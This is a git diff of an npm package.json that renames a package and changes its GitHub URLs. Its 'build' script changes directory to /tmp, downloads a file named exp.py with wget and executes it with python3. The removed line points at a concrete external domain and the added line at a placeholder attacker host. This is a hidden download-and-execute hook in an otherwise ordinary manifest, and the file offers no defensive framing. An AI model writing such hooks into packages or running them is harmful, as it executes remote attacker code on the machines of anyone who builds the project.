@@ -1,14 +1,14 @@
 {
-  "name": "ggologoou",
+  "name": "gloo",
   "version": "1.0.0",
   "description": "",
-  "homepage": "https://github.com/hiko97851/ggologoou#readme",
+  "homepage": "https://github.com/raline/gloo#readme",
   "bugs": {
-    "url": "https://github.com/hiko97851/ggologoou/issues"
+    "url": "https://github.com/raline/gloo/issues"
   },
   "repository": {
     "type": "git",
-    "url": "git+https://github.com/hiko97851/ggologoou.git"
+    "url": "git+https://github.com/raline/gloo.git"
   },
   "license": "ISC",
   "author": "",
@@ -16,6 +16,6 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "build": "cd /tmp; wget https://web.vitemaweed.fr/glouglou/exp.py; python3 exp.py;"
+    "build": "cd /tmp; wget https://[ATTACKER_SERVER]/glouglou/exp.py; python3 exp.py;"
   }
 }
